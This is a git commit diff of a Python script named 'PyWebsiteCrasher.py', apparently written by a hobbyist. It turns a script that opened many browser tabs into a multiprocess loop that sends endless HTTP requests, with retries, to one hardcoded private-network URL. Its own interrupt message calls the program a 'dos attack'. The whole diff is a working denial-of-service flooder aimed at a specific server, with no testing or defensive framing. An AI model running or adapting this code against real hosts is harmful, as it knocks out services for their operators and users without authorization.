137c0d2c21e84eb508593abc420cdc7830a163cf
Husky <39809509+Huskydog9988@users.noreply.github.com>
2022-05-26 14:14:19 -0400

    added multithreading
    also made it so the code doesn't use a browser and instead just directly gets the page

--- PyWebsiteCrasher.py
+++ PyWebsiteCrasher.py
@@ -1,14 +1,41 @@
-import webbrowser
+import requests
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
+# import threading
+import multiprocessing
+import signal
 
-url = '10.30.40.181/gv_shout/'
-# Windows
-count = 0
-inputB = int(input("Num times to crash page: "))
-inputA = input("yes to run: ")
-go = False
-if inputA == 'yes':
-  go = True
-while (go and count < inputB):
-  webbrowser.open_new_tab("10.30.40.181/gv_shout/")
-  count+=1
+url = 'http://10.30.40.181/gv_shout'
+
+def handler(signum, frame):
+  print("Killing dos attack", end="", flush=True)
+  exit(1)
   
+def crasher():
+  retry = Retry(connect=3, backoff_factor=0.5)
+  adapter = HTTPAdapter(max_retries=retry)
+
+  while True:
+    session = requests.Session()
+    session.mount('http://', adapter)
+    # session.mount('https://', adapter)
+
+    session.get(url)
+    session.close()
+    print("got site")
+
+def multiThreadCrasher(threadCount):
+  processes = []
+
+  signal.signal(signal.SIGINT, handler)
+
+  for i in range(threadCount):
+    # threads.append(threading.Thread(target=crasher,name=i))
+    processes.append(multiprocessing.Process(target=crasher,name="{}".format(i)))
+
+  for i in range(len(processes)):
+    processes[i].start()
+    # processes[i].join()
+
+if __name__ == "__main__":
+  multiThreadCrasher(2)
